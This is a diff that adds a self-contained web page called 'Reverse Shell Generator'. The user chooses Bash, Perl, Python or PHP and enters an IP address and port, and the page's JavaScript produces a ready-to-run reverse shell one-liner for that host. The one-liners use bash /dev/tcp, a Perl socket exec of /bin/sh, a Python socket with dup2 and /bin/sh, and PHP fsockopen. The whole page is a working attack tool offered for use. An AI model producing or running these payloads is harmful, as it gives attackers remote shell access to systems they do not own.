@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Reverse Shell Generator</title>
+  <style>
+    body {
+      font-family: 'Courier New', Courier, monospace;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-image: url('https://i.gifer.com/7jiL.gif');
+      background-size: cover;
+      background-position: center;
+    }
+    .container {
+      max-width: 600px;
+      width: 100%;
+      padding: 20px;
+      box-shadow: 0px 0px 10px rgba(0, 255, 0, 0.5);
+      background-color: rgba(0, 0, 0, 0.7);
+      border-radius: 5px;
+    }
+    h1 {
+      text-align: center;
+      color: #0f0;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      color: #0f0;
+    }
+    input, select, textarea {
+      width: 100%;
+      padding: 8px;
+      background-color: #000;
+      border: 1px solid #0f0;
+      color: #0f0;
+      border-radius: 3px;
+      box-sizing: border-box;
+      font-family: 'Courier New', Courier, monospace;
+      margin-bottom: 10px;
+    }
+    button {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      background-color: #00f;
+      color: #0f0;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-family: 'Courier New', Courier, monospace;
+      margin-bottom: 10px;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+    textarea {
+      width: 100%;
+      height: 200px;
+      margin-bottom: 10px;
+      background-color: #000;
+      color: #0f0;
+      border: 1px solid #0f0;
+      border-radius: 3px;
+      font-family: 'Courier New', Courier, monospace;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Reverse Shell Generator</h1>
+    <label for="payload">Choose your payload:</label>
+    <select id="payload">
+      <option value="bash">Bash</option>
+      <option value="perl">Perl</option>
+      <option value="python">Python</option>
+      <option value="php">PHP</option>
+    </select>
+    <label for="ip">Enter your IP:</label>
+    <input type="text" id="ip" placeholder="IP address">
+    <label for="port">Enter the port:</label>
+    <input type="text" id="port" placeholder="Port number">
+    <button onclick="generate()">Generate</button>
+    <label for="output">Generated Payload:</label>
+    <textarea id="output" readonly></textarea>
+  </div>
+
+  <script>
+    function generate() {
+      var payload = document.getElementById("payload").value;
+      var ip = document.getElementById("ip").value;
+      var port = document.getElementById("port").value;
+      var output = document.getElementById("output");
+
+      if (ip === "" || port === "") {
+        alert("Please enter IP and port!");
+        return;
+      }
+
+      switch(payload) {
+        case "bash":
+          output.value = `\u001b[32mbash -i >& /dev/tcp/${ip}/${port} 0>&1\u001b[0m`;
+          break;
+        case "perl":
+          output.value = `\u001b[32mperl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'\u001b[0m`;
+          break;
+        case "python":
+          output.value = `\u001b[32mpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'\u001b[0m`;
+          break;
+        case "php":
+          output.value = `\u001b[32mphp -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'\u001b[0m`;
+          break;
+        default:
+          output.value = "\u001b[31mInvalid payload\u001b[0m";
+      }
+    }
+  </script>
+</body>
+</html>
